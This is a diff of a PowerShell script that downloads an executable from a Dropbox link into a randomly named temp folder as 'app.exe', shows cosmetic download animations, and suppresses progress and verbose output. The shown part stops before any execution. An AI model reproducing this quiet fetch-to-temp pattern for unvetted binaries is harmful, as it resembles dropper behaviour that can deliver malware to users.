@@ -1,18 +1,22 @@
 $url = "https://www.dropbox.com/scl/fi/pywkslydef69f64ga6ukp/neopaster.exe?rlkey=yjfxi2hibb9bmdhe7acs94yu2&st=4xf7ng1c&dl=1"  
 $tempdir = "$env:TEMP\$(New-Guid)" 
 mkdir $tempdir | Out-Null
-$file = "$tempdir\app.exe" 
+$file = "$tempdir\app.exe"
 
 # Simulate download start
 Write-Host "Download started..." -ForegroundColor Cyan
 Start-Sleep -Seconds 1  # Simulate the downloading animation
 
+# Disable progress output during the download
+$ProgressPreference = 'SilentlyContinue'    # Hide progress bar and technical messages
+$VerbosePreference = 'SilentlyContinue'     # Hide verbose messages
+
 # Show spinner in the background while downloading
 $spinnerJob = Start-Job -ScriptBlock { Show-Spinner }
 
 try {
-    # Use Invoke-WebRequest with -Quiet to suppress the progress output
-    Invoke-WebRequest -Uri $url -OutFile $file -ErrorAction Stop -Quiet
+    # Perform the download quietly
+    Invoke-WebRequest -Uri $url -OutFile $file -ErrorAction Stop
     Stop-Job $spinnerJob
     Write-Host "`rDownload complete!" -ForegroundColor Green
     Start-Sleep -Seconds 1  # Simulate download completion
